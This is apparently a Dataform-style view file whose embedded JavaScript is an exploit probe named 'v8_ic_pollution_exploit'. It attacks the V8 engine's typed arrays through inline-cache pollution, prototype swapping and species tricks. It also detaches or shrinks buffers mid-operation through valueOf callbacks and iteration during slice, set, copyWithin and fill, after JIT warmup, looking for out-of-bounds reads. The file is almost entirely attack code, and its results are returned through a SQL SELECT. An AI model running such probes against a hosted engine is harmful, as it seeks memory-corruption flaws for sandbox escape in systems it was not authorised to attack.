config { type: "view", name: "v8_ic_pollution_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "IC pollution to force JIT to use JS-visible length property"
  };

  // =============================================================================
  // TEST 1: Train IC with custom length accessor then switch to TypedArray
  // =============================================================================
  results.test1_icTrain = {};
  try {
    // Phase 1: Train with objects that have custom length behavior
    function readWithLength(obj, idx) {
      if (idx < obj.length) {
        return obj[idx];
      }
      return -1;
    }

    // Custom array-like with controllable length
    class FakeArray {
      constructor(realLen, fakeLen) {
        this._data = new Array(realLen).fill(0).map((_, i) => i * 10);
        this._fakeLen = fakeLen;
      }
      get length() { return this._fakeLen; }
      get [Symbol.iterator]() { return this._data[Symbol.iterator].bind(this._data); }
    }

    // Add numeric index accessors
    const fakeArr = new FakeArray(10, 1000);
    for (let i = 0; i < 100; i++) {
      Object.defineProperty(fakeArr, i, {
        get() { return this._data[i] || 0xBEEF; }
      });
    }

    // Warm up IC with FakeArray
    for (let i = 0; i < 50000; i++) {
      readWithLength(fakeArr, i % 50);
    }

    const fakeResult = readWithLength(fakeArr, 50);  // Should return 0xBEEF

    // Phase 2: Now use detached TypedArray with overridden length
    const buf = new ArrayBuffer(64);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 64; i++) view[i] = i;

    const newBuf = buf.transfer();
    Object.defineProperty(view, 'length', { value: 1000 });

    // Try to access through IC-trained function
    const detachedResults = [];
    for (let idx of [0, 32, 64, 128]) {
      detachedResults.push({
        idx,
        value: readWithLength(view, idx),
        rawAccess: view[idx]
      });
    }

    results.test1_icTrain = {
      status: "completed",
      fakeResult,
      detachedResults
    };
  } catch(e) {
    results.test1_icTrain = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Prototype chain confusion - make TypedArray inherit from array-like
  // =============================================================================
  results.test2_protoConfuse = {};
  try {
    const buf = new ArrayBuffer(32);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 32; i++) view[i] = 0xAA;

    // Record original prototype chain
    const originalProto = Object.getPrototypeOf(view);

    // Create fake prototype with OOB data
    const fakeProto = {
      __proto__: originalProto,
      32: 0xBB,
      64: 0xCC,
      128: 0xDD,
      256: 0xEE
    };

    // Try to change prototype
    let protoChangeResult = "not attempted";
    try {
      Object.setPrototypeOf(view, fakeProto);
      protoChangeResult = "succeeded";
    } catch(e) {
      protoChangeResult = "failed: " + e.message.substring(0, 50);
    }

    // Now transfer and test
    const newBuf = buf.transfer();

    const protoReads = [];
    for (let idx of [0, 31, 32, 64, 128, 256]) {
      protoReads.push({
        idx,
        value: view[idx],
        hasOwn: view.hasOwnProperty(idx)
      });
    }

    results.test2_protoConfuse = {
      status: "completed",
      protoChangeResult,
      currentProto: Object.getPrototypeOf(view) === fakeProto ? "fakeProto" : "original",
      protoReads
    };
  } catch(e) {
    results.test2_protoConfuse = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Species pattern - constructor returns different type
  // =============================================================================
  results.test3_species = {};
  try {
    // Create TypedArray subclass with different species
    class ConfusedArray extends Uint8Array {
      static get [Symbol.species]() {
        return Array;  // Return regular Array instead of TypedArray
      }
    }

    const buf = new ArrayBuffer(64);
    const confused = new ConfusedArray(buf);
    for (let i = 0; i < 64; i++) confused[i] = i;

    // Operations that use Species
    const mapped = confused.map(x => x * 2);
    const filtered = confused.filter(x => x > 30);
    const sliced = confused.slice(0, 10);

    results.test3_species = {
      status: "completed",
      originalType: confused.constructor.name,
      mappedType: mapped.constructor.name,
      filteredType: filtered.constructor.name,
      slicedType: sliced.constructor.name,
      mappedLength: mapped.length,
      mappedIsTypedArray: mapped instanceof Uint8Array,
      mappedFirst5: Array.from(mapped).slice(0, 5)
    };
  } catch(e) {
    results.test3_species = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Resizable buffer shrink during iteration
  // =============================================================================
  results.test4_resizeDuring = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    function iterateAndShrink(v, shrinkAt, shrinkTo) {
      const results = [];
      for (let i = 0; i < v.length; i++) {
        if (i === shrinkAt) {
          // Shrink buffer mid-iteration
          try {
            rab.resize(shrinkTo);
          } catch(e) {
            results.push({ i, event: "shrink failed", error: e.message.substring(0, 30) });
          }
        }
        try {
          results.push({ i, value: v[i] });
        } catch(e) {
          results.push({ i, error: e.message.substring(0, 30) });
        }
        if (results.length > 20) break;  // Limit output
      }
      return results;
    }

    // JIT warmup without shrinking
    for (let iter = 0; iter < 10000; iter++) {
      rab.resize(256);
      let sum = 0;
      for (let i = 0; i < view.length; i++) {
        sum += view[i] || 0;
      }
    }

    // Now shrink during iteration
    rab.resize(256);
    const shrinkResults = iterateAndShrink(view, 50, 32);

    results.test4_resizeDuring = {
      status: "completed",
      finalLength: view.length,
      finalByteLength: rab.byteLength,
      iterationResults: shrinkResults
    };
  } catch(e) {
    results.test4_resizeDuring = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: Transfer during method execution via getter
  // =============================================================================
  results.test5_transferViaGetter = {};
  try {
    const buf = new ArrayBuffer(64);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 64; i++) view[i] = i;

    let newBuf = null;
    let transferCount = 0;

    // Object with getter that transfers the buffer
    const evilStart = {
      valueOf() {
        transferCount++;
        if (transferCount === 1 && !newBuf) {
          newBuf = buf.transfer();
        }
        return 0;
      }
    };

    const evilEnd = {
      valueOf() {
        return 1000;  // Way beyond buffer bounds
      }
    };

    // Try slice with evil bounds
    let sliceResult = null;
    let sliceError = null;
    try {
      sliceResult = view.slice(evilStart, evilEnd);
    } catch(e) {
      sliceError = e.message.substring(0, 100);
    }

    // Try subarray
    transferCount = 0;
    newBuf = null;
    const buf2 = new ArrayBuffer(64);
    const view2 = new Uint8Array(buf2);

    const evilStart2 = {
      valueOf() {
        if (!newBuf) newBuf = buf2.transfer();
        return 0;
      }
    };

    let subarrayResult = null;
    let subarrayError = null;
    try {
      subarrayResult = view2.subarray(evilStart2, 1000);
    } catch(e) {
      subarrayError = e.message.substring(0, 100);
    }

    results.test5_transferViaGetter = {
      status: "completed",
      sliceResult: sliceResult ? {
        type: sliceResult.constructor.name,
        length: sliceResult.length,
        first5: Array.from(sliceResult).slice(0, 5)
      } : null,
      sliceError,
      subarrayResult: subarrayResult ? {
        type: subarrayResult.constructor.name,
        length: subarrayResult.length
      } : null,
      subarrayError
    };
  } catch(e) {
    results.test5_transferViaGetter = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: set() with overlapping views and concurrent modification
  // =============================================================================
  results.test6_setOverlap = {};
  try {
    const buf = new ArrayBuffer(128);
    const view1 = new Uint8Array(buf, 0, 64);
    const view2 = new Uint8Array(buf, 32, 64);

    // Initialize
    for (let i = 0; i < 64; i++) {
      view1[i] = i;
    }

    const beforeSet = Array.from(view1.slice(0, 16));

    // JIT warmup
    for (let iter = 0; iter < 50000; iter++) {
      const temp1 = new Uint8Array(64);
      const temp2 = new Uint8Array(32);
      temp1.set(temp2);
    }

    // Overlapping set
    view1.set(view2);
    const afterSet = Array.from(view1.slice(0, 16));

    // Now with transfer mid-set
    const buf2 = new ArrayBuffer(128);
    const view2a = new Uint8Array(buf2, 0, 64);
    const view2b = new Uint8Array(buf2, 32, 64);
    for (let i = 0; i < 64; i++) view2a[i] = i;

    // Source that transfers during iteration
    let transferredBuf = null;
    const evilSource = {
      length: 64,
      [Symbol.iterator]: function*() {
        for (let i = 0; i < 64; i++) {
          if (i === 10 && !transferredBuf) {
            transferredBuf = buf2.transfer();
          }
          yield i * 2;
        }
      }
    };

    let setWithTransferError = null;
    try {
      view2a.set(evilSource);
    } catch(e) {
      setWithTransferError = e.message.substring(0, 100);
    }

    const afterEvilSet = Array.from(new Uint8Array(transferredBuf || buf2).slice(0, 16));

    results.test6_setOverlap = {
      status: "completed",
      beforeSet,
      afterSet,
      setWithTransferError,
      afterEvilSet,
      view2aLength: view2a.length
    };
  } catch(e) {
    results.test6_setOverlap = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: copyWithin during detach
  // =============================================================================
  results.test7_copyWithin = {};
  try {
    function testCopyWithin() {
      const buf = new ArrayBuffer(64);
      const view = new Uint8Array(buf);
      for (let i = 0; i < 64; i++) view[i] = i;

      let transferred = null;
      const evilTarget = {
        valueOf() {
          if (!transferred) transferred = buf.transfer();
          return 0;
        }
      };

      let error = null;
      let result = null;
      try {
        result = view.copyWithin(evilTarget, 32, 64);
      } catch(e) {
        error = e.message.substring(0, 100);
      }

      return { error, viewLength: view.length, transferred: !!transferred };
    }

    // JIT warmup
    for (let i = 0; i < 50000; i++) {
      const temp = new Uint8Array(64);
      temp.copyWithin(0, 32, 64);
    }

    const copyResult = testCopyWithin();

    results.test7_copyWithin = {
      status: "completed",
      ...copyResult
    };
  } catch(e) {
    results.test7_copyWithin = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: fill() with detach during execution
  // =============================================================================
  results.test8_fillDetach = {};
  try {
    function testFill() {
      const buf = new ArrayBuffer(64);
      const view = new Uint8Array(buf);

      let transferred = null;
      const evilValue = {
        valueOf() {
          if (!transferred) transferred = buf.transfer();
          return 0xDD;
        }
      };

      let error = null;
      try {
        view.fill(evilValue, 0, 64);
      } catch(e) {
        error = e.message.substring(0, 100);
      }

      // Check what happened to transferred buffer
      let newBufContents = null;
      if (transferred) {
        newBufContents = Array.from(new Uint8Array(transferred).slice(0, 16));
      }

      return { error, viewLength: view.length, transferred: !!transferred, newBufContents };
    }

    // JIT warmup
    for (let i = 0; i < 50000; i++) {
      const temp = new Uint8Array(64);
      temp.fill(0xAA);
    }

    const fillResult = testFill();

    results.test8_fillDetach = {
      status: "completed",
      ...fillResult
    };
  } catch(e) {
    results.test8_fillDetach = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 8,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    interestingFindings: []
  };

  // Look for interesting behavior
  if (results.test3_species && results.test3_species.mappedType === "Array") {
    results.summary.interestingFindings.push("Species returns Array instead of TypedArray");
  }

  if (results.test5_transferViaGetter && !results.test5_transferViaGetter.sliceError) {
    results.summary.interestingFindings.push("slice() succeeded after transfer-via-getter");
  }

  if (results.test6_setOverlap && !results.test6_setOverlap.setWithTransferError) {
    results.summary.interestingFindings.push("set() continued after buffer transfer");
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as ic_pollution_exploit
